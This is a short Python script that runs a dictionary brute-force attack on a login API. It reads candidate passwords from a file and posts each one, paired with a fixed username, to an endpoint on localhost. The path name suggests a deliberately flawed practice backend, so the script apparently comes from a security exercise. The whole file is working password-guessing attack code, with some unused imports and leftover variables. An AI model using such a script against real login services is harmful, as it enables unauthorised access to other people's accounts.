import requests
from html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os
import json


url = 'http://localhost:8080/securitybackendflaws/api/user/login'
username = 'admin'


def build_password(password_file):
    file = open(password_file)
    passwords = []
    for line in file:
        passwords.append(line.rstrip())
    return passwords


def bruteForce(passwords):

    for passw in passwords:
        body = {"username": "AndersAnd", "password": "{}".format(passw)}

        request = urllib.request.Request(url)
        request.add_header('Content-Type', 'application/json')
        jsondata = json.dumps(body)

        jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes

        request.add_header('Content-Length', len(jsondataasbytes))

        print(jsondataasbytes)

        request = urllib.request.Request(url)
        request.add_header('Content-Type', 'application/json')
        response = urllib.request.urlopen(request, jsondataasbytes)

        print(response.read())


file = build_password('passwords.txt')
bruteForce(file)
